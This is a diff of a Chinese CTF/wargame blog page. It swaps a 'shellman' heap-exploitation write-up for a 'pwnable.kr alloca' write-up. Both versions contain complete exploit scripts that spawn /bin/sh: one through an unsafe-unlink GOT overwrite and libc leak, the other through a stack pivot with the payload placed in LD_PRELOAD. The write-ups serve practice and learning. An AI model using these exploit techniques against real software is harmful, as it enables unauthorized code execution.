@@ -84,22 +84,16 @@
 
 
 
-<meta name="description" content="练习用
-Conclusion利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60def">
+<meta name="description" content="Conclusion0x08048779 &amp;#60;+417&amp;#62;:&amp;#9;call   0x8048560 &amp;#60;check_canary&amp;#62;&amp;#10;0x0804877e &amp;#60;+422&amp;#62;:&amp;#9;mov    eax,0x0&amp;#10;0x08048783 &amp;#60;+427&amp;#62;:&amp;#9;mov    ecx,DWORD PTR [ebp-0x4]&amp;#10;0x">
 <meta property="og:type" content="article">
-<meta property="og:title" content="qiangwang-qual-2015-shellman">
-<meta property="og:url" content="http://0byjwzsf.me/2016/07/21/qiangwang-qual-2015-shellman/index.html">
+<meta property="og:title" content="pwnable.kr-rookiss-alloca">
+<meta property="og:url" content="http://0byjwzsf.me/2016/08/08/pwnable-rookiss-alloca/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="练习用
-Conclusion利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60def">
-<meta property="og:updated_time" content="2016-08-08T08:09:01.000Z">
+<meta property="og:description" content="Conclusion0x08048779 &amp;#60;+417&amp;#62;:&amp;#9;call   0x8048560 &amp;#60;check_canary&amp;#62;&amp;#10;0x0804877e &amp;#60;+422&amp;#62;:&amp;#9;mov    eax,0x0&amp;#10;0x08048783 &amp;#60;+427&amp;#62;:&amp;#9;mov    ecx,DWORD PTR [ebp-0x4]&amp;#10;0x">
+<meta property="og:updated_time" content="2016-08-08T08:06:11.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="qiangwang-qual-2015-shellman">
-<meta name="twitter:description" content="练习用
-Conclusion利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60def">
+<meta name="twitter:title" content="pwnable.kr-rookiss-alloca">
+<meta name="twitter:description" content="Conclusion0x08048779 &amp;#60;+417&amp;#62;:&amp;#9;call   0x8048560 &amp;#60;check_canary&amp;#62;&amp;#10;0x0804877e &amp;#60;+422&amp;#62;:&amp;#9;mov    eax,0x0&amp;#10;0x08048783 &amp;#60;+427&amp;#62;:&amp;#9;mov    ecx,DWORD PTR [ebp-0x4]&amp;#10;0x">
 
 
 
@@ -120,9 +114,9 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/07/21/qiangwang-qual-2015-shellman/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/08/08/pwnable-rookiss-alloca/"/>
 
-  <title> qiangwang-qual-2015-shellman | Icemakr's Blog </title>
+  <title> pwnable.kr-rookiss-alloca | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -292,7 +286,7 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
             
             
               
-                qiangwang-qual-2015-shellman
+                pwnable.kr-rookiss-alloca
               
             
           </h1>
@@ -304,8 +298,8 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-21T00:00:00+08:00" content="2016-07-21">
-              2016-07-21
+            <time itemprop="dateCreated" datetime="2016-08-08T00:00:00+08:00" content="2016-08-08">
+              2016-08-08
             </time>
           </span>
 
@@ -318,8 +312,8 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
                   </a>
                 </span>
 
@@ -334,8 +328,8 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/21/qiangwang-qual-2015-shellman/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/21/qiangwang-qual-2015-shellman/" itemprop="commentsCount"></span>
+                <a href="/2016/08/08/pwnable-rookiss-alloca/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/08/pwnable-rookiss-alloca/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -358,9 +352,23 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
       
 
       
-        <p>练习用</p>
-<h2 id="Conclusion">Conclusion</h2><p>利用<a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a>中提到的<code>unsafe-unlink2</code>的技巧，通过泄露libc来调用system</p>
-<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./shellman.b400c663a0ca53f1f6c6fcbf60defa8d'</span></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">100000</span>)</span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007b0])    # new</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x400790])     # delete</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007a0])     # edit</span></span><br><span class="line">io.gdb_hint([<span class="number">0x4007a7</span>])     <span class="comment"># edit finish</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007c0])     # list</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_shellcode</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'SHELLC0DE 0: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_shellcode</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Length of new shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode(in raw format): '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_shellcode</span><span class="params">(index, shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line">    io.read_until(<span class="string">'Length of shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode: '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_shellcode</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'A'</span> * <span class="number">0x90</span>)</span><br><span class="line">new_shellcode(<span class="string">'B'</span> * <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">adr_shellcode0  = <span class="number">0x6016d0</span></span><br><span class="line"></span><br><span class="line">fake0   =   l64(<span class="number">0x30</span>)</span><br><span class="line">fake0   +=  l64(<span class="number">0x91</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">2</span>)</span><br><span class="line">fake0   =   fake0.ljust(<span class="number">0x90</span>, <span class="string">'A'</span>)</span><br><span class="line">fake1   =   l64(<span class="number">0x90</span>)</span><br><span class="line">fake1   +=  l64(<span class="number">0xa0</span>)</span><br><span class="line">payload = fake0 + fake1</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, payload)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_free    = <span class="number">0x601600</span></span><br><span class="line">edit_shellcode(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">0x8</span> + l64(<span class="number">0x1</span>) + l64(<span class="number">0x8</span>) + l64(got_free))</span><br><span class="line">list_shellcode()</span><br><span class="line"></span><br><span class="line">adr_free        = l64(io.read(<span class="number">0x10</span>).decode(<span class="string">'hex'</span>))</span><br><span class="line">offset_free     = <span class="number">0x82df0</span></span><br><span class="line">libc_base       = adr_free - offset_free</span><br><span class="line">offset_system   = <span class="number">0x46640</span></span><br><span class="line">adr_system      = libc_base + offset_system</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, l64(adr_system))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+        <h1 id="Conclusion">Conclusion</h1><figure class="highlight"><table><tr><td class="code"><pre><span class="line">0x08048779 &#60;+417&#62;:&#9;call   0x8048560 &#60;check_canary&#62;&#10;0x0804877e &#60;+422&#62;:&#9;mov    eax,0x0&#10;0x08048783 &#60;+427&#62;:&#9;mov    ecx,DWORD PTR [ebp-0x4]&#10;0x08048786 &#60;+430&#62;:&#9;leave&#10;0x08048787 &#60;+431&#62;:&#9;lea    esp,[ecx-0x4]&#10;0x0804878a &#60;+434&#62;:&#9;ret</span><br></pre></td></tr></table></figure>
+<p>可以看到，0x8048783~0x8048787处的指令的作用相当于调整<code>$esp</code>为<code>$ebp-4</code>的值，只要能劫持<code>$ebp-4</code>处的值，即可控制<code>$esp</code>，之后的<code>ret</code>指令就可以跳转到<code>$esp</code>处存的值所指向的内存，即控制了<code>$eip</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_canary</span><span class="params">(<span class="keyword">int</span> canary)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> result = canary ^ g_canary;</span><br><span class="line">	<span class="keyword">int</span> canary_after = canary;</span><br><span class="line">	<span class="keyword">int</span> canary_before = g_canary;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里会发现，result，canary_after，canary_before都会存在栈上。于是我们可以选取合适的<code>g_canary</code>，利用这个函数，覆盖<code>$ebp-4</code>处的值</p>
+<p>我想到了这里接下去就想不出了，纠结了很久，后来在github上发现了韩国的一位童鞋<a href="https://github.com/Qwaz/solved-hacking-problem/blob/master/pwnable.kr/alloca/payload.py" target="_blank" rel="external"><strong>@Yechan Bae</strong></a>写的exp，才意识到这个是本地利用，可以通过<code>ulimit -s unlimited</code>固定libc加载的地址，再通过<code>export LD_PRELOAD=</code>设置环境变量，来存我们的payload。这两个trick实在没想到，折腾了好久。</p>
+<p>只想到了通过alloca来调整<strong>$esp</strong>，使得</p>
+<h1 id="Trick">Trick</h1><ul>
+<li><code>ulimit -s unlimited</code> 对于32位程序可以使<strong>shared object</strong>加载地址固定，但是<strong>stack</strong>的地址仍然是随机的</li>
+<li><code>export PRELOAD=AAAA</code> 程序会去加载名字为AAAA的共享库</li>
+</ul>
+<p>这两个配合使用，相当于在程序内获得了一块地址固定的buffer:)</p>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># ulimit -s unlimited</span></span><br><span class="line"><span class="comment"># export LD_PRELOAD=$(python -c print "\xb0\xa0\x5c\x55deadbeef\x40\xbc\x6e\x55")</span></span><br><span class="line"></span><br><span class="line">off_system  = <span class="number">0x0003f0b0</span>    <span class="comment"># objdump -d /lib/i386-linux-gnu/libc.so.6 | grep system</span></span><br><span class="line">off_shell   = <span class="number">0x00160c40</span>    <span class="comment"># grep -oba /bin/sh /lib/i386-linux-gnu/libc.so.6</span></span><br><span class="line">adr_libc    = <span class="number">0x5558b000</span>    <span class="comment"># ldd alloca</span></span><br><span class="line">adr_payload = <span class="number">0x5557b857</span>    <span class="comment"># info proc mappings ; find 0x5557a000,+0x2000,"\x41\x41\x41\x41"</span></span><br><span class="line"></span><br><span class="line">payload     =   p32(adr_libc + off_system)</span><br><span class="line">payload     +=  p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload     +=  p32(adr_libc + off_shell)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'ulimit -s unlimited'</span>)</span><br><span class="line">p = process(<span class="string">'/home/alloca/alloca'</span>, env = &#123;<span class="string">'LD_PRELOAD'</span>: payload&#125;)</span><br><span class="line">p.sendline(str(-<span class="number">92</span>))                       <span class="comment"># -83 ~ -98 is ok</span></span><br><span class="line">p.sendline(str((adr_payload + <span class="number">4</span>) ^ <span class="number">0x5572fff4</span>))      <span class="comment"># 0x5572fff4 is read from stack</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h1 id="Referance">Referance</h1><p><a href="https://github.com/Qwaz/solved-hacking-problem/blob/master/pwnable.kr/alloca/payload.py" target="_blank" rel="external">https://github.com/Qwaz/solved-hacking-problem/blob/master/pwnable.kr/alloca/payload.py</a></p>
+<p><a href="http://stackoverflow.com/questions/426230/what-is-the-ld-preload-trick" target="_blank" rel="external">http://stackoverflow.com/questions/426230/what-is-the-ld-preload-trick</a></p>
+<p><a href="http://stackoverflow.com/questions/5691193/gdb-listing-all-mapped-memory-regions-for-a-crashed-process" target="_blank" rel="external">http://stackoverflow.com/questions/5691193/gdb-listing-all-mapped-memory-regions-for-a-crashed-process</a></p>
+<p><a href="https://sourceware.org/gdb/onlinedocs/gdb/Searching-Memory.html" target="_blank" rel="external">https://sourceware.org/gdb/onlinedocs/gdb/Searching-Memory.html</a></p>
 
       
     </div>
@@ -392,17 +400,13 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/07/20/protostar/" rel="next" title="protostar">
-                <i class="fa fa-chevron-left"></i> protostar
+              <a href="/2016/08/05/pwnable-rookiss-note/" rel="next" title="pwnable.kr-rookiss-note">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-note
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/07/21/def-con-qual-2016-babyfirst/" rel="prev" title="def-con-qual-2016-babyfirst">
-                def-con-qual-2016-babyfirst <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -534,7 +538,7 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Trick"><span class="nav-number">2.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referance"><span class="nav-number">4.</span> <span class="nav-text">Referance</span></a></li></ol></div>
             
           </div>
         </section>
@@ -661,9 +665,9 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/07/21/qiangwang-qual-2015-shellman/';
-      var disqus_title = "qiangwang-qual-2015-shellman";
-      var disqus_url = 'http://0byjwzsf.me/2016/07/21/qiangwang-qual-2015-shellman/';
+      var disqus_identifier = '2016/08/08/pwnable-rookiss-alloca/';
+      var disqus_title = "pwnable.kr-rookiss-alloca";
+      var disqus_url = 'http://0byjwzsf.me/2016/08/08/pwnable-rookiss-alloca/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
